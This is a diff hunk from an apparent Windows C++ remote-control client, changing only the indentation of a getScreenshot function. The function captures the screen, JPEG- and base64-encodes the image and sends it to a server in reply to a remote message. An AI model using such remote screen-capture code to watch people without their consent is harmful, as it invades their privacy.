@@ -209,27 +209,27 @@ void Controller::getScreenshot(json::json message) {
     DeleteDC(hMemDC);
     ReleaseDC(NULL, hDC);
 
-	std::vector<BYTE> buf;
-	IStream *stream = NULL;
-	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
-	CImage image;
-	ULARGE_INTEGER liSize;
+    std::vector<BYTE> buf;
+    IStream *stream = NULL;
+    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
+    CImage image;
+    ULARGE_INTEGER liSize;
 
-	image.Attach(hBitmap);
-	image.Save(stream, Gdiplus::ImageFormatJPEG);
-	IStream_Size(stream, &liSize);
-	DWORD len = liSize.LowPart;
-	IStream_Reset(stream);
-	buf.resize(len);
-	IStream_Read(stream, &buf[0], len);
-	stream->Release();
+    image.Attach(hBitmap);
+    image.Save(stream, Gdiplus::ImageFormatJPEG);
+    IStream_Size(stream, &liSize);
+    DWORD len = liSize.LowPart;
+    IStream_Reset(stream);
+    buf.resize(len);
+    IStream_Read(stream, &buf[0], len);
+    stream->Release();
 
-	std::string fileBase64String = base64_encode(std::string(buf.begin(), buf.end()));
-	
-	json::json response;
-	response["id"] = message["id"];
-	response["file"] = fileBase64String;
-	Networking::sendToServer(response.dump());
+    std::string fileBase64String = base64_encode(std::string(buf.begin(), buf.end()));
+
+    json::json response;
+    response["id"] = message["id"];
+    response["file"] = fileBase64String;
+    Networking::sendToServer(response.dump());
 
     DeleteObject(hBitmap);
 }
